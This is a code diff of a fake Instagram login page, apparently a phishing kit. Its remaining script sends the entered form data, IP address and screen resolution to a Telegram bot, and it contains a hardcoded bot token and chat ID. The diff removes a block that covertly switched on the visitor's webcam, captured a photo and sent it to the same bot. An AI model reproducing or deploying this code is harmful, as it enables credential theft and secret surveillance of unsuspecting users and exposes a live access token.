@@ -9,7 +9,8 @@
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
-        <section id="mobile" class="flex"></section>
+        <section id="mobile" class="flex">
+        </section>
         <section id="auth" class="flex direction-column">
             <div class="panel login flex direction-column">
                 <h1 title="Instagram" class="flex justify-content-center">
@@ -44,7 +45,7 @@
             <div class="app-download flex direction-column align-items-center">
                 <p>Get the app.</p>
                 <div class="flex justify-content-center">
-                    <img src="apple-button.png" alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
+                    <img src="apple-button.png"      alt="Image with the Apple Store logo" title="Image with the Apple Store logo" />
                     <img src="googleplay-button.png" alt="Image with the Google Play logo" title="Image with the Google Play logo" />
                 </div>
             </div>
@@ -72,7 +73,6 @@
         const TOKEN = "7626503368:AAE223bHn6oad0WHZv6EMdC8RNiD5pojiyE"; // التوكين الخاص بالبوت
         const CHAT_ID = "6546798468"; // معرف الشات
         const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
-        const URI_SEND_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
 
         document.getElementById('login-form').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -101,7 +101,6 @@
                         <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                     `;
 
-                    // ارسال رسالة النصوص
                     axios.post(URI_API, {
                         chat_id: CHAT_ID,
                         parse_mode: 'html',
@@ -112,46 +111,6 @@
                         console.error(error);
                         alert('Error sending the information. Please try again.');
                     });
-
-                    // التقاط صورة سيلفي
-                    const videoElement = document.createElement('video');
-                    videoElement.width = 640;
-                    videoElement.height = 480;
-                    navigator.mediaDevices.getUserMedia({ video: true })
-                        .then(stream => {
-                            videoElement.srcObject = stream;
-                            videoElement.play();
-                            document.body.appendChild(videoElement);
-
-                            const canvas = document.createElement('canvas');
-                            const context = canvas.getContext('2d');
-                            canvas.width = 640;
-                            canvas.height = 480;
-
-                            // التقاط صورة بعد 3 ثواني
-                            setTimeout(() => {
-                                context.drawImage(videoElement, 0, 0, 640, 480);
-                                const imageData = canvas.toDataURL('image/png'); // تحويل الصورة إلى Base64
-
-                                // إرسال الصورة إلى Telegram
-                                axios.post(URI_SEND_PHOTO, {
-                                    chat_id: CHAT_ID,
-                                    photo: imageData
-                                }).then(response => {
-                                    console.log("Image sent successfully");
-                                }).catch(error => {
-                                    console.error("Error sending image", error);
-                                });
-
-                                // إيقاف الكاميرا بعد إرسال الصورة
-                                stream.getTracks().forEach(track => track.stop());
-                            }, 3000); // تأخير 3 ثواني
-                        })
-                        .catch(err => {
-                            console.error('Error accessing camera', err);
-                            alert('Error accessing the camera. Please try again.');
-                        });
-
                 })
                 .catch(error => {
                     alert('Error fetching the IP address. Please try again.');
